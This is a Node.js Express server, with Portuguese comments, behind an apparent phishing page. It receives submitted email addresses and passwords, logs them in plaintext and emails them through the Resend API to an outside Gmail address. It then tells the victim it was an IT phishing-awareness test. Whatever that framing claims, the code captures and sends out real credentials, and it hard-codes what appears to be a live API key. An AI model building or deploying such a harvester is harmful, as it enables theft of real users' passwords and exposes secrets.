const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const { Resend } = require('resend');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Inicializa Resend com sua API Key
const resend = new Resend('re_bjc3V1g6_JDBHpPnr1vUPjMASnzUa46MA');

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/', async (req, res) => {
  const { email, senha } = req.body;

  // Loga os dados no console (visível nos logs do Render)
  console.log(`📥 Dados recebidos: Email = ${email}, Senha = ${senha}`);

  try {
    await resend.emails.send({
      from: 'onboarding@resend.dev', // remetente verificado
      to: 'smtptesteenvio1@gmail.com', // seu email de destino
      subject: 'Nova submissão do formulário Connect',
      html: `<p><strong>Login:</strong> ${email}<br><strong>Chave:</strong> ${senha}</p>`
    });

    console.log('✅ Email enviado com sucesso para smtptesteenvio1@gmail.com');

    res.send(`
      <h2 style="font-family:Arial; color:#c62828; text-align:center; margin-top:100px;">
        Você acaba de cair em um teste de phishing.
      </h2>
      <p style="text-align:center; font-family:Arial;">
        Esta é uma simulação de segurança realizada pela equipe de TI para fins de conscientização.
      </p>
    `);
  } catch (error) {
    console.error('❌ Erro ao enviar email:', error);
    res.send('Erro ao processar os dados.');
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Servidor rodando na porta ${PORT}`);
});
